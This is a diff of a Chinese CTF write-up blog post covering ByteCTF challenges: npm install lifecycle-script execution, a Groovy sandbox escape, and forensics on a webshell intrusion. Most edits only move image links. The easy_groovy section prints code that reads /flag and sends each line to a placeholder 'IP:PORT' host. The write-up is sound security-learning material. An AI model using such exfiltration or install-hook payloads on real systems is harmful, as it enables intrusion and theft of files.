@@ -15,7 +15,7 @@ categories:
 
 <!-- more -->
 
-![](https://hujiekang.top/images/uploads/big/babcf0697f6ee29b68b6e644dc861820.png)
+![](https://pic.hujiekang.top/uploads/big/babcf0697f6ee29b68b6e644dc861820.png)
 
 读取配置文件`/etc/grafana/grafana.ini`，发现SecretKey：
 
@@ -190,11 +190,11 @@ router.post('/signup', function(req, res, next) {
 
 然后通过`admin 123456`就能以管理员身份登录，登进去是个CTF云的啥界面：
 
-![](https://hujiekang.top/images/uploads/big/52a9ab5291597f63242dc4db81b497e1.png)
+![](https://pic.hujiekang.top/uploads/big/52a9ab5291597f63242dc4db81b497e1.png)
 
 继续看源码，发现在public目录下有个app目录，长下面这样：
 
-![](https://hujiekang.top/images/uploads/big/f479ed9ff58c6eb912463aee6f5bb231.png)
+![](https://pic.hujiekang.top/uploads/big/f479ed9ff58c6eb912463aee6f5bb231.png)
 
 功能点是可以上传文件到public/uploads目录下，还可以在package.json中添加依赖，并且管理员可以对该目录下的整个Node.js项目进行安装，对应如下代码：
 
@@ -236,7 +236,7 @@ router.post('/run', function(req, res, next) {
 
 赛后复现的时候不知道是不是网络原因，拉Github仓库经常没反应，所以经常收不到请求，或者需要等很久才能收到。
 
-![](https://hujiekang.top/images/uploads/big/0da313f4318752c7ed1599e387aca8a4.png)
+![](https://pic.hujiekang.top/uploads/big/0da313f4318752c7ed1599e387aca8a4.png)
 
 因此看了其他人的WriteUp，因为Dockerfile里面给了文件的位置，所以还可以通过本地文件来载入依赖。写一个package.json上传，然后把public/uploads目录当作一个Node.js项目进行安装即可。
 
@@ -265,7 +265,7 @@ router.post('/run', function(req, res, next) {
 
 随后直接访问根目录下对应文件即可。经过上面的package.json对安装过程的所有生命周期节点都测试了一遍，发现`preprepare`和`postprepare`没有写入，其他的都写入了文件。
 
-![](https://hujiekang.top/images/uploads/big/e1cc772f6c32c29ab24be4fb4b959135.png)
+![](https://pic.hujiekang.top/uploads/big/e1cc772f6c32c29ab24be4fb4b959135.png)
 
 包括上面这两点，NPM的`dependencies`支持以下方式加载依赖：
 
@@ -274,8 +274,8 @@ router.post('/run', function(req, res, next) {
 - 从URL加载Tarball形式的包
 - 从Git仓库链接加载
   - `git+ssh://git@github.com:npm/cli.git#v1.0.27`
-  - `git+ssh://git@github.com:npm/cli#semver:^5.0` 
-  - `git+https://isaacs@github.com/npm/cli.git` 
+  - `git+ssh://git@github.com:npm/cli#semver:^5.0`
+  - `git+https://isaacs@github.com/npm/cli.git`
   - `git://github.com/npm/cli.git#v1.0.27`
 - 本地目录
   - `"bar": "file:../foo/bar"`
@@ -295,7 +295,7 @@ router.post('/run', function(req, res, next) {
 
 一堆纯前端的关卡，最后请求`/api/signin`，需要传参队伍名称和ID，但是不知道队伍ID是啥，于是乎爆破：
 
-![](https://hujiekang.top/images/uploads/big/73f4163bbd8a1772942256d530188eee.png)
+![](https://pic.hujiekang.top/uploads/big/73f4163bbd8a1772942256d530188eee.png)
 
 ## easy_groovy
 
@@ -310,7 +310,7 @@ for(f in files) {
 }
 ```
 
-![](https://hujiekang.top/images/uploads/big/59c9ce47b60cdadaf4ca0fa052929975.png)
+![](https://pic.hujiekang.top/uploads/big/59c9ce47b60cdadaf4ca0fa052929975.png)
 
 然后读flag，简单粗暴：
 
@@ -318,44 +318,44 @@ for(f in files) {
 def file=new java.io.File("/flag");
 def line;
 file.withReader {
-    reader -> while((line = reader.readLine()) != null){ 
+    reader -> while((line = reader.readLine()) != null){
         new URL("http://IP:PORT/" + line).openConnection().getResponseCode()
     }
 }
 ```
 
-![](https://hujiekang.top/images/uploads/big/f9e587fd0fdb667e3af72e5bd7990a37.png)
+![](https://pic.hujiekang.top/uploads/big/f9e587fd0fdb667e3af72e5bd7990a37.png)
 
 ## find_it
 
 下载附件，是个`.scap`文件，一搜还以为是UEFI固件，然后用`file`确认了一下，原来是个流量包hhh
 
-![](https://hujiekang.top/images/uploads/medium/c5577422032f2dc5eb2e2d71ef54adf4.png)
+![](https://pic.hujiekang.top/uploads/medium/c5577422032f2dc5eb2e2d71ef54adf4.png)
 
 是一个记录了系统调用序列的流量包，首先filter了一下命令执行的，也就是`execve()`，对应Wireshark里面的调用号是293，规则`sysdig.event_type==293`，在最后几个数据中找到了一些有意思的东西：
 
 首先是这个`sh -c`，后面的`echo`一眼看出是蚁剑的定界符，所以猜测可能有Webshell的写入操作：
 
-![](https://hujiekang.top/images/uploads/big/4b05ec116f0014384f97fe01cc6dad11.png)
+![](https://pic.hujiekang.top/uploads/big/4b05ec116f0014384f97fe01cc6dad11.png)
 
 以及下面这个一句话木马的写入操作，更确定了这个猜测：
 
-![](https://hujiekang.top/images/uploads/big/484beac7115e91add986c9361d8f5ce3.png)
+![](https://pic.hujiekang.top/uploads/big/484beac7115e91add986c9361d8f5ce3.png)
 
 在对Web日志的写入调用中发现了写一句话的具体URI，还是个ThinkPHP：
 
-![](https://hujiekang.top/images/uploads/big/249f3a6f02b5c711090a3f1c09f1ff70.png)
+![](https://pic.hujiekang.top/uploads/big/249f3a6f02b5c711090a3f1c09f1ff70.png)
 
 紧跟在`bash nothing.sh`之后的是一个`openssl`加密命令，能推测出传了个图片文件nothing.png（看样子出题人也和我一样没钱恰KFC疯狂星期四捏）
 
-![](https://hujiekang.top/images/uploads/big/7f3881c9dcbd9938b7a08b7815e1869d.png)
+![](https://pic.hujiekang.top/uploads/big/7f3881c9dcbd9938b7a08b7815e1869d.png)
 
 于是去掉filter之后，在其前面的某个`read()`调用中找到了nothing.png，扫出来是前半截flag：`bytectf{53f8fb16-a25d-4aac-`
 
-![](https://hujiekang.top/images/uploads/big/319877a44b8f3fae93b7e48763ccbd22.png)
+![](https://pic.hujiekang.top/uploads/big/319877a44b8f3fae93b7e48763ccbd22.png)
 
 然后看来看去也没看见其他的命令执行了，想起前面翻到的Web日志，于是接着去找Web的请求信息，找到了这样一个`write()`调用：
 
-![](https://hujiekang.top/images/uploads/big/f576e63bb764c459e99b23b15cb3d6e5.png)
+![](https://pic.hujiekang.top/uploads/big/f576e63bb764c459e99b23b15cb3d6e5.png)
 
 找到后半截Flag：`bec5-d7563b2672b6}`，完整`bytectf{53f8fb16-a25d-4aac-bec5-d7563b2672b6}`
